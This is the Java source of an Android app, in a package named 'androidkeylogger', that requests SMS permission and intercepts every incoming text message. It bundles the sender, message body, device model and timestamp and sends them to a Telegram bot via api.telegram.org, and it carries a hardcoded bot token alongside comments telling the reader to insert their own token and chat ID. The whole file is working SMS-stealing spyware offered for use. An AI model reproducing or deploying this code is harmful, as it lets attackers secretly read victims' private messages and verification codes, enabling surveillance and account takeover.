package com.bshu2.androidkeylogger;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.single.PermissionListener;
import com.karumi.dexter.listener.PermissionDeniedResponse;
import com.karumi.dexter.listener.PermissionGrantedResponse;

import com.example.sample.Constants; // ✅ Replace this with your actual constants class

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class SmsEyeMainActivity extends AppCompatActivity {

    private SmsReceiver smsReceiver;
    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4"; // 🔁 Replace with your actual bot token

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Dexter.withContext(this)
                .withPermission(Manifest.permission.RECEIVE_SMS)
                .withListener(new PermissionListener() {
                    @Override
                    public void onPermissionGranted(PermissionGrantedResponse response) {
                        Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Granted", Toast.LENGTH_SHORT).show();
                        registerSMSReceiver();
                    }

                    @Override
                    public void onPermissionDenied(PermissionDeniedResponse response) {
                        Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Denied", Toast.LENGTH_SHORT).show();
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(PermissionRequest permission, PermissionToken token) {
                        token.continuePermissionRequest();
                    }
                })
                .check();
    }

    private void registerSMSReceiver() {
        smsReceiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }

    public static class SmsReceiver extends BroadcastReceiver {
        private static final String TAG = "SmsReceiver";

        @Override
        public void onReceive(Context context, Intent intent) {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            if (pdus == null) return;

            StringBuilder smsMessage = new StringBuilder();

            for (Object pdu : pdus) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                smsMessage.append("From: ").append(message.getDisplayOriginatingAddress()).append("\n");
                smsMessage.append("Message: ").append(message.getDisplayMessageBody()).append("\n");
            }

            String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
                    .format(Calendar.getInstance().getTime());
            String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
            String logMessage = "[" + deviceName + "] " + timestamp + "\n" + smsMessage.toString();

            new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, logMessage);
        }
    }

    public static class SendToTelegramTask extends AsyncTask<String, Void, Void> {
        private static final String TAG = "SendToTelegramTask";

        @Override
        protected Void doInBackground(String... params) {
            try {
                String botToken = params[0];
                String chatId = params[1];
                String message = params[2];

                String telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");

                URL url = new URL(telegramUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                }

                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Error sending message to Telegram", e);
            }
            return null;
        }
    }
}

